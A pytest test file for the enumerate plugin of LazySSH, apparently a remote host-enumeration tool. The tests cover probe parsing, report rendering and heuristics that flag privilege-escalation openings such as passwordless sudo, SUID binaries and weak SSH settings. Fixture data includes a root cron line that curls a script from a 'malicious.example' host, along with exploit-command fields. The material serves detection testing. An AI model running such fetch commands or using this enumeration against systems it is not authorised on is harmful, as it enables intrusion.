"""Tests for the enumerate plugin - priority findings, rendering, and heuristics."""

from datetime import UTC, datetime
from pathlib import Path

import pytest

from lazyssh.plugins import enumerate as enumerate_plugin
from lazyssh.plugins._enumeration_plan import REMOTE_PROBES


def _probe(
    category: str, key: str, stdout: str, status: int = 0, stderr: str = ""
) -> enumerate_plugin.ProbeOutput:
    return enumerate_plugin.ProbeOutput(
        category=category,
        key=key,
        command="<test>",
        timeout=5,
        status=status,
        stdout=stdout,
        stderr=stderr,
        encoding="base64",
    )


class TestProbeOutput:
    """Tests for ProbeOutput dataclass."""

    def test_to_dict(self) -> None:
        """Test ProbeOutput to_dict method."""
        probe = _probe("system", "kernel", "5.10.100")
        result = probe.to_dict()
        assert result["category"] == "system"
        assert result["key"] == "kernel"
        assert result["stdout"] == "5.10.100"
        assert result["status"] == 0

    def test_to_dict_with_error(self) -> None:
        """Test ProbeOutput to_dict with error status."""
        probe = _probe("system", "kernel", "", status=1, stderr="command not found")
        result = probe.to_dict()
        assert result["status"] == 1
        assert result["stderr"] == "command not found"


class TestPriorityFinding:
    """Tests for PriorityFinding dataclass."""

    def test_to_dict(self) -> None:
        """Test PriorityFinding to_dict method."""
        finding = enumerate_plugin.PriorityFinding(
            key="test_key",
            category="test_cat",
            severity="high",
            headline="Test Headline",
            detail="Test detail",
            evidence=["evidence1", "evidence2"],
        )
        result = finding.to_dict()
        assert result["key"] == "test_key"
        assert result["category"] == "test_cat"
        assert result["severity"] == "high"
        assert result["headline"] == "Test Headline"
        assert len(result["evidence"]) == 2
        assert result["exploitation_difficulty"] == ""
        assert result["exploit_commands"] == []

    def test_to_dict_with_exploit_fields(self) -> None:
        """Test PriorityFinding to_dict with exploit fields populated."""
        finding = enumerate_plugin.PriorityFinding(
            key="test_key",
            category="test_cat",
            severity="critical",
            headline="Test Headline",
            detail="Test detail",
            evidence=["evidence1"],
            exploitation_difficulty="instant",
            exploit_commands=["echo 'exploit'"],
        )
        result = finding.to_dict()
        assert result["severity"] == "critical"
        assert result["exploitation_difficulty"] == "instant"
        assert result["exploit_commands"] == ["echo 'exploit'"]


class TestRemoteExecutionError:
    """Tests for RemoteExecutionError exception."""

    def test_error_creation(self) -> None:
        """Test RemoteExecutionError with stdout and stderr."""
        error = enumerate_plugin.RemoteExecutionError(
            "Test error", stdout="output", stderr="error output"
        )
        assert "Test error" in str(error)
        assert error.stdout == "output"
        assert error.stderr == "error output"

    def test_error_defaults(self) -> None:
        """Test RemoteExecutionError with default empty strings."""
        error = enumerate_plugin.RemoteExecutionError("Test error")
        assert error.stdout == ""
        assert error.stderr == ""


class TestHelperFunctions:
    """Tests for helper functions."""

    def test_shell_quote(self) -> None:
        """Test _shell_quote function."""
        result = enumerate_plugin._shell_quote("test value")
        assert "'" in result or result == "test value"

    def test_first_nonempty_line_simple(self) -> None:
        """Test _first_nonempty_line with simple input."""
        result = enumerate_plugin._first_nonempty_line("first\nsecond")
        assert result == "first"

    def test_first_nonempty_line_empty_start(self) -> None:
        """Test _first_nonempty_line with empty lines at start."""
        result = enumerate_plugin._first_nonempty_line("\n\nthird\nfourth")
        assert result == "third"

    def test_first_nonempty_line_all_empty(self) -> None:
        """Test _first_nonempty_line with all empty lines."""
        result = enumerate_plugin._first_nonempty_line("\n\n  \n")
        assert result == ""

    def test_extract_paths(self) -> None:
        """Test _extract_paths function."""
        result = enumerate_plugin._extract_paths("/usr/bin/sudo\n/usr/bin/passwd\n")
        assert len(result) == 2
        assert "/usr/bin/sudo" in result
        assert "/usr/bin/passwd" in result

    def test_extract_paths_empty_lines(self) -> None:
        """Test _extract_paths ignores empty lines."""
        result = enumerate_plugin._extract_paths("/path1\n\n/path2\n  \n")
        assert len(result) == 2

    def test_summarize_text_normal(self) -> None:
        """Test _summarize_text with normal input."""
        result = enumerate_plugin._summarize_text("Some output\nMore output")
        assert "Some output" in result
        assert "More output" in result

    def test_summarize_text_empty(self) -> None:
        """Test _summarize_text with empty input."""
        result = enumerate_plugin._summarize_text("")
        assert result == "No data"

    def test_summarize_text_whitespace(self) -> None:
        """Test _summarize_text with whitespace only."""
        result = enumerate_plugin._summarize_text("   \n  \n   ")
        assert result == "No data"

    def test_summarize_text_crlf(self) -> None:
        """Test _summarize_text normalizes CRLF."""
        result = enumerate_plugin._summarize_text("line1\r\nline2\rline3")
        assert "\r" not in result

    def test_format_count_label_singular(self) -> None:
        """Test _format_count_label with singular."""
        result = enumerate_plugin._format_count_label(1, "file", "files")
        assert result == "1 file"

    def test_format_count_label_plural(self) -> None:
        """Test _format_count_label with plural."""
        result = enumerate_plugin._format_count_label(5, "file", "files")
        assert result == "5 files"


class TestBuildRemoteScript:
    """Tests for build_remote_script function."""

    def test_build_script_basic(self) -> None:
        """Test build_remote_script generates valid shell script."""
        script = enumerate_plugin.build_remote_script(REMOTE_PROBES[:2])
        assert "#!/bin/sh" in script
        assert "set -eu" in script
        assert "run_probe" in script

    def test_build_script_contains_probe_commands(self) -> None:
        """Test script contains probe commands."""
        script = enumerate_plugin.build_remote_script(REMOTE_PROBES[:3])
        # Should have heredoc markers
        assert "LAZYSSH_CMD_0" in script
        assert "LAZYSSH_CMD_1" in script

    def test_build_script_encoder_selection(self) -> None:
        """Test script has encoder selection logic."""
        script = enumerate_plugin.build_remote_script(REMOTE_PROBES[:1])
        assert "ENCODER=" in script
        assert "base64" in script
        assert "openssl" in script


class TestGetEnvOrFail:
    """Tests for _get_env_or_fail function."""

    def test_get_env_present(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test _get_env_or_fail when var is present."""
        monkeypatch.setenv("TEST_VAR", "test_value")
        result = enumerate_plugin._get_env_or_fail("TEST_VAR")
        assert result == "test_value"

    def test_get_env_missing(self) -> None:
        """Test _get_env_or_fail raises when var is missing."""
        with pytest.raises(enumerate_plugin.RemoteExecutionError) as exc_info:
            enumerate_plugin._get_env_or_fail("NONEXISTENT_VAR_XYZ123")
        assert "Missing required environment variable" in str(exc_info.value)


def test_priority_findings_and_json_payload() -> None:
    probes: dict[str, dict[str, enumerate_plugin.ProbeOutput]] = {
        "system": {
            "kernel": _probe("system", "kernel", "5.10.100-custom"),
        },
        "users": {
            "id": _probe(
                "users",
                "id",
                "uid=1000(sam) gid=1000(sam) groups=1000(sam),10(wheel),27(sudo)",
            ),
            "sudo_check": _probe(
                "users",
                "sudo_check",
                "User sam may run the following commands on host:\n    (root) NOPASSWD: /bin/systemctl\n",
            ),
            "sudoers": _probe(
                "users",
                "sudoers",
                "sam ALL=(ALL) NOPASSWD: ALL\n",
            ),
        },
        "filesystem": {
            "suid_files": _probe(
                "filesystem",
                "suid_files",
                "/usr/bin/sudo\n/usr/bin/passwd\n",
            ),
            "sgid_files": _probe(
                "filesystem",
                "sgid_files",
                "/usr/bin/locate\n",
            ),
            "world_writable_dirs": _probe(
                "filesystem",
                "world_writable_dirs",
                "/opt/shared\n/var/www/html\n",
            ),
        },
        "network": {
            "listening_services": _probe(
                "network",
                "listening_services",
                'tcp    LISTEN 0      128    0.0.0.0:80      0.0.0.0:*     users:(("nginx",pid=42,fd=6))',
            ),
        },
        "security": {
            "ssh_config": _probe(
                "security",
                "ssh_config",
                "PermitRootLogin yes\nPasswordAuthentication yes\n",
            ),
        },
        "scheduled": {
            "cron_system": _probe(
                "scheduled",
                "cron_system",
                "* * * * * root curl http://malicious.example/run.sh\n",
            ),
        },
        "packages": {
            "package_inventory": _probe(
                "packages",
                "package_inventory",
                "linux-image-5.10.90\nbash\ncoreutils\n",
            ),
            "package_manager": _probe("packages", "package_manager", "dpkg"),
        },
    }

    snapshot = enumerate_plugin.EnumerationSnapshot(
        collected_at=datetime.now(UTC),
        probes=probes,
        warnings=[],
    )

    findings = enumerate_plugin.generate_priority_findings(snapshot)

    # Original 8 heuristics should fire with the original probes
    expected_keys = {
        "sudo_membership",
        "passwordless_sudo",
        "suid_binaries",
        "world_writable_dirs",
        "exposed_network_services",
        "weak_ssh_configuration",
        "suspicious_scheduled_tasks",
        "kernel_drift",
    }
    assert expected_keys.issubset({finding.key for finding in findings})

    plain_report = enumerate_plugin.render_plain(snapshot, findings)
    assert "LazySSH Enumeration Summary" in plain_report
    assert "PermitRootLogin yes" in plain_report

    json_payload = enumerate_plugin.build_json_payload(snapshot, findings, plain_report)
    assert json_payload["probe_count"] == sum(len(group) for group in probes.values())
    assert json_payload["categories"]["users"]["id"]["stdout"].startswith("uid=1000")
    assert "summary_text" in json_payload
    assert "LazySSH Enumeration Summary" in json_payload["summary_text"]

    # Verify new PriorityFinding fields appear in JSON output
    for finding_dict in json_payload["priority_findings"]:
        assert "exploitation_difficulty" in finding_dict
        assert "exploit_commands" in finding_dict


def test_render_plain_includes_warnings() -> None:
    snapshot = enumerate_plugin.EnumerationSnapshot(
        collected_at=datetime.now(UTC),
        probes={
            "system": {"os_release": _probe("system", "os_release", "NAME=TestOS")},
        },
        warnings=["Remote stderr: timeout exceeded"],
    )
    findings: list[enumerate_plugin.PriorityFinding] = []

    report = enumerate_plugin.render_plain(snapshot, findings)
    assert "Warnings:" in report
    assert "timeout exceeded" in report


class TestHeuristicEvaluators:
    """Tests for individual heuristic evaluator functions."""

    def test_evaluate_sudo_membership_found(self) -> None:
        """Test sudo_membership detection."""
        probes = {
            "users": {
                "id": _probe("users", "id", "uid=1000(user) gid=1000(user) groups=sudo,wheel"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "sudo_membership")
        result = enumerate_plugin._evaluate_sudo_membership(snapshot, meta)
        assert result is not None
        assert result.key == "sudo_membership"

    def test_evaluate_sudo_membership_root(self) -> None:
        """Test sudo_membership for root user."""
        probes = {
            "users": {
                "id": _probe("users", "id", "uid=0(root) gid=0(root) groups=0(root)"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "sudo_membership")
        result = enumerate_plugin._evaluate_sudo_membership(snapshot, meta)
        assert result is not None

    def test_evaluate_sudo_membership_not_found(self) -> None:
        """Test sudo_membership when not in sudo group."""
        probes = {
            "users": {
                "id": _probe("users", "id", "uid=1000(user) gid=1000(user) groups=users"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "sudo_membership")
        result = enumerate_plugin._evaluate_sudo_membership(snapshot, meta)
        assert result is None

    def test_evaluate_sudo_membership_no_probe(self) -> None:
        """Test sudo_membership with missing probe."""
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "sudo_membership")
        result = enumerate_plugin._evaluate_sudo_membership(snapshot, meta)
        assert result is None

    def test_evaluate_passwordless_sudo_found(self) -> None:
        """Test passwordless_sudo detection."""
        probes = {
            "users": {
                "sudoers": _probe("users", "sudoers", "user ALL=(ALL) NOPASSWD: ALL\n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "passwordless_sudo")
        result = enumerate_plugin._evaluate_passwordless_sudo(snapshot, meta)
        assert result is not None
        assert result.key == "passwordless_sudo"

    def test_evaluate_passwordless_sudo_not_found(self) -> None:
        """Test passwordless_sudo when not present."""
        probes = {
            "users": {
                "sudoers": _probe("users", "sudoers", "user ALL=(ALL) ALL\n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "passwordless_sudo")
        result = enumerate_plugin._evaluate_passwordless_sudo(snapshot, meta)
        assert result is None

    def test_evaluate_suid_binaries_found(self) -> None:
        """Test suid_binaries detection."""
        probes = {
            "filesystem": {
                "suid_files": _probe("filesystem", "suid_files", "/usr/bin/sudo\n/usr/bin/su\n"),
                "sgid_files": _probe("filesystem", "sgid_files", "/usr/bin/locate\n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "suid_binaries")
        result = enumerate_plugin._evaluate_suid_binaries(snapshot, meta)
        assert result is not None
        assert "2 SUID binaries" in result.detail
        assert "1 SGID binary" in result.detail

    def test_evaluate_suid_binaries_not_found(self) -> None:
        """Test suid_binaries when none present."""
        probes = {
            "filesystem": {
                "suid_files": _probe("filesystem", "suid_files", ""),
                "sgid_files": _probe("filesystem", "sgid_files", ""),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "suid_binaries")
        result = enumerate_plugin._evaluate_suid_binaries(snapshot, meta)
        assert result is None

    def test_evaluate_world_writable_found(self) -> None:
        """Test world_writable_dirs detection."""
        probes = {
            "filesystem": {
                "world_writable_dirs": _probe(
                    "filesystem", "world_writable_dirs", "/opt/shared\n/var/www\n"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "world_writable_dirs")
        result = enumerate_plugin._evaluate_world_writable(snapshot, meta)
        assert result is not None
        assert "2 detected" in result.detail

    def test_evaluate_world_writable_not_found(self) -> None:
        """Test world_writable_dirs when none present."""
        probes = {
            "filesystem": {
                "world_writable_dirs": _probe("filesystem", "world_writable_dirs", ""),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "world_writable_dirs")
        result = enumerate_plugin._evaluate_world_writable(snapshot, meta)
        assert result is None

    def test_evaluate_world_writable_whitespace_only(self) -> None:
        """Test world_writable_dirs when stdout has only whitespace (no actual paths)."""
        probes = {
            "filesystem": {
                "world_writable_dirs": _probe("filesystem", "world_writable_dirs", "   \n\n  \n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "world_writable_dirs")
        result = enumerate_plugin._evaluate_world_writable(snapshot, meta)
        # Should return None because no actual dirs were extracted
        assert result is None

    def test_evaluate_exposed_services_found(self) -> None:
        """Test exposed_network_services detection."""
        probes = {
            "network": {
                "listening_services": _probe(
                    "network",
                    "listening_services",
                    "tcp    LISTEN 0      128    0.0.0.0:22      0.0.0.0:*\n"
                    "tcp    LISTEN 0      128    :::80           :::*\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "exposed_network_services")
        result = enumerate_plugin._evaluate_exposed_services(snapshot, meta)
        assert result is not None

    def test_evaluate_exposed_services_not_found(self) -> None:
        """Test exposed_network_services when only localhost."""
        probes = {
            "network": {
                "listening_services": _probe(
                    "network",
                    "listening_services",
                    "tcp    LISTEN 0      128    127.0.0.1:22    127.0.0.1:*\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "exposed_network_services")
        result = enumerate_plugin._evaluate_exposed_services(snapshot, meta)
        assert result is None

    def test_evaluate_weak_ssh_found(self) -> None:
        """Test weak_ssh_configuration detection."""
        probes = {
            "security": {
                "ssh_config": _probe(
                    "security",
                    "ssh_config",
                    "PermitRootLogin yes\nPasswordAuthentication yes\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "weak_ssh_configuration")
        result = enumerate_plugin._evaluate_weak_ssh(snapshot, meta)
        assert result is not None

    def test_evaluate_weak_ssh_effective_config(self) -> None:
        """Test weak_ssh uses effective_config preferentially."""
        probes = {
            "security": {
                "ssh_effective_config": _probe(
                    "security",
                    "ssh_effective_config",
                    "PermitEmptyPasswords yes\n",
                ),
                "ssh_config": _probe("security", "ssh_config", "PermitRootLogin no\n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "weak_ssh_configuration")
        result = enumerate_plugin._evaluate_weak_ssh(snapshot, meta)
        assert result is not None

    def test_evaluate_weak_ssh_not_found(self) -> None:
        """Test weak_ssh when config is secure."""
        probes = {
            "security": {
                "ssh_config": _probe(
                    "security",
                    "ssh_config",
                    "PermitRootLogin no\nPasswordAuthentication no\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "weak_ssh_configuration")
        result = enumerate_plugin._evaluate_weak_ssh(snapshot, meta)
        assert result is None

    def test_evaluate_suspicious_scheduled_found(self) -> None:
        """Test suspicious_scheduled_tasks detection."""
        probes = {
            "scheduled": {
                "cron_system": _probe(
                    "scheduled", "cron_system", "* * * * * root curl http://example.com/script.sh\n"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "suspicious_scheduled_tasks")
        result = enumerate_plugin._evaluate_suspicious_scheduled(snapshot, meta)
        assert result is not None
        assert "curl" in str(result.evidence)

    def test_evaluate_suspicious_scheduled_reboot(self) -> None:
        """Test suspicious_scheduled_tasks with @reboot."""
        probes = {
            "scheduled": {
                "cron_user": _probe("scheduled", "cron_user", "@reboot /home/user/startup.sh\n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "suspicious_scheduled_tasks")
        result = enumerate_plugin._evaluate_suspicious_scheduled(snapshot, meta)
        assert result is not None

    def test_evaluate_suspicious_scheduled_not_found(self) -> None:
        """Test suspicious_scheduled_tasks when none present."""
        probes = {
            "scheduled": {
                "cron_system": _probe(
                    "scheduled", "cron_system", "0 4 * * * root /usr/bin/logrotate\n"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "suspicious_scheduled_tasks")
        result = enumerate_plugin._evaluate_suspicious_scheduled(snapshot, meta)
        assert result is None

    def test_evaluate_kernel_drift_found(self) -> None:
        """Test kernel_drift detection."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "5.10.100-custom"),
            },
            "packages": {
                "package_inventory": _probe(
                    "packages", "package_inventory", "linux-image-5.10.90\n"
                ),
                "package_manager": _probe("packages", "package_manager", "dpkg"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "kernel_drift")
        result = enumerate_plugin._evaluate_kernel_drift(snapshot, meta)
        assert result is not None
        assert "5.10.100-custom" in result.detail

    def test_evaluate_kernel_drift_matching(self) -> None:
        """Test kernel_drift when kernel matches package."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "5.10.100"),
            },
            "packages": {
                "package_inventory": _probe(
                    "packages", "package_inventory", "linux-image-5.10.100\n"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "kernel_drift")
        result = enumerate_plugin._evaluate_kernel_drift(snapshot, meta)
        assert result is None

    def test_evaluate_kernel_drift_empty_kernel(self) -> None:
        """Test kernel_drift when kernel version is whitespace only."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "   \n"),
            },
            "packages": {
                "package_inventory": _probe(
                    "packages", "package_inventory", "linux-image-5.10.100\n"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

        meta = next(h for h in PRIORITY_HEURISTICS if h.key == "kernel_drift")
        result = enumerate_plugin._evaluate_kernel_drift(snapshot, meta)
        # Should return None because kernel version is empty after strip
        assert result is None


class TestRenderRich:
    """Tests for render_rich function."""

    def test_render_rich_with_findings(self) -> None:
        """Test render_rich outputs to console."""
        probes = {
            "system": {"kernel": _probe("system", "kernel", "5.10.100")},
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="high",
                headline="Test Finding",
                detail="Test detail",
                evidence=["evidence"],
            )
        ]
        # Just verify it doesn't crash
        enumerate_plugin.render_rich(snapshot, findings)

    def test_render_rich_no_findings(self) -> None:
        """Test render_rich with no findings."""
        probes = {
            "system": {"kernel": _probe("system", "kernel", "5.10.100")},
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        enumerate_plugin.render_rich(snapshot, [])

    def test_render_rich_with_error_status(self) -> None:
        """Test render_rich with probe error status."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "", status=1, stderr="permission denied")
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        enumerate_plugin.render_rich(snapshot, [])


class TestRenderPlainEdgeCases:
    """Tests for render_plain edge cases."""

    def test_render_plain_no_findings(self) -> None:
        """Test render_plain with no findings."""
        probes = {
            "system": {"kernel": _probe("system", "kernel", "5.10.100")},
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        report = enumerate_plugin.render_plain(snapshot, [])
        assert "None detected by heuristics" in report

    def test_render_plain_with_error_status(self) -> None:
        """Test render_plain with probe error."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "output", status=1, stderr="error occurred")
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        report = enumerate_plugin.render_plain(snapshot, [])
        assert "exit 1:" in report


class TestBuildJsonPayload:
    """Tests for build_json_payload function."""

    def test_build_json_payload_basic(self) -> None:
        """Test build_json_payload creates valid structure."""
        probes = {
            "system": {"kernel": _probe("system", "kernel", "5.10.100")},
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        findings = [
            enumerate_plugin.PriorityFinding(
                key="test",
                category="test",
                severity="high",
                headline="Test",
                detail="Detail",
                evidence=["e1"],
            )
        ]
        plain_text = "Summary text"
        result = enumerate_plugin.build_json_payload(snapshot, findings, plain_text)
        assert "collected_at" in result
        assert "probe_count" in result
        assert result["probe_count"] == 1
        assert "priority_findings" in result
        assert len(result["priority_findings"]) == 1
        assert "categories" in result
        assert "summary_text" in result

    def test_build_json_payload_with_warnings(self) -> None:
        """Test build_json_payload includes warnings."""
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=["Warning 1", "Warning 2"]
        )
        result = enumerate_plugin.build_json_payload(snapshot, [], "text")
        assert "warnings" in result
        assert len(result["warnings"]) == 2


class TestGetProbe:
    """Tests for _get_probe helper."""

    def test_get_probe_found(self) -> None:
        """Test _get_probe finds existing probe."""
        probes = {
            "system": {"kernel": _probe("system", "kernel", "5.10")},
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._get_probe(snapshot, "system", "kernel")
        assert result is not None
        assert result.stdout == "5.10"

    def test_get_probe_missing_category(self) -> None:
        """Test _get_probe with missing category."""
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        result = enumerate_plugin._get_probe(snapshot, "missing", "kernel")
        assert result is None

    def test_get_probe_missing_key(self) -> None:
        """Test _get_probe with missing key."""
        probes = {"system": {}}
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._get_probe(snapshot, "system", "missing")
        assert result is None


class TestDecodePayload:
    """Tests for _decode_payload function."""

    def test_decode_empty_payload(self) -> None:
        """Test decoding empty payload."""
        result = enumerate_plugin._decode_payload("", "base64")
        assert result == ""

    def test_decode_base64_valid(self) -> None:
        """Test decoding valid base64."""
        import base64

        original = "Hello, World!"
        encoded = base64.b64encode(original.encode()).decode()
        result = enumerate_plugin._decode_payload(encoded, "base64")
        assert result == original

    def test_decode_base64_invalid(self) -> None:
        """Test decoding invalid base64 returns original."""
        result = enumerate_plugin._decode_payload("not-valid-base64!!!", "base64")
        # Should return original as fallback
        assert result == "not-valid-base64!!!"

    def test_decode_hex_valid(self) -> None:
        """Test decoding valid hex."""
        original = "Hello"
        encoded = original.encode().hex()
        result = enumerate_plugin._decode_payload(encoded, "hex")
        assert result == original

    def test_decode_hex_invalid(self) -> None:
        """Test decoding invalid hex returns original."""
        result = enumerate_plugin._decode_payload("not-hex!", "hex")
        assert result == "not-hex!"

    def test_decode_raw(self) -> None:
        """Test raw decoding returns original."""
        result = enumerate_plugin._decode_payload("raw text", "raw")
        assert result == "raw text"


class TestEnumerationSnapshot:
    """Tests for EnumerationSnapshot dataclass."""

    def test_snapshot_creation(self) -> None:
        """Test EnumerationSnapshot creation."""
        probes = {
            "system": {"kernel": _probe("system", "kernel", "5.10")},
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC),
            probes=probes,
            warnings=["warning1"],
        )
        assert snapshot.probes == probes
        assert len(snapshot.warnings) == 1


class TestGeneratePriorityFindings:
    """Tests for generate_priority_findings function."""

    def test_empty_snapshot(self) -> None:
        """Test with empty snapshot returns empty findings."""
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        findings = enumerate_plugin.generate_priority_findings(snapshot)
        assert findings == []

    def test_missing_evaluator(self) -> None:
        """Test gracefully handles missing evaluator."""
        # The function should handle cases where evaluator is not found
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        # This should not crash
        enumerate_plugin.generate_priority_findings(snapshot)


class TestRenderRichWithWarnings:
    """Tests for render_rich with warnings."""

    def test_render_rich_with_warnings(self) -> None:
        """Test render_rich displays warnings."""
        probes = {
            "system": {"kernel": _probe("system", "kernel", "5.10.100")},
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC),
            probes=probes,
            warnings=["Remote connection unstable"],
        )
        # Just verify it doesn't crash
        enumerate_plugin.render_rich(snapshot, [])


class TestExecuteRemoteBatch:
    """Tests for execute_remote_batch function."""

    def test_missing_env_vars(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test execute_remote_batch fails with missing env vars."""
        monkeypatch.delenv("LAZYSSH_SOCKET_PATH", raising=False)
        monkeypatch.delenv("LAZYSSH_HOST", raising=False)
        monkeypatch.delenv("LAZYSSH_USER", raising=False)

        with pytest.raises(enumerate_plugin.RemoteExecutionError):
            enumerate_plugin.execute_remote_batch("echo test")

    def test_with_port(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test execute_remote_batch includes port when set."""
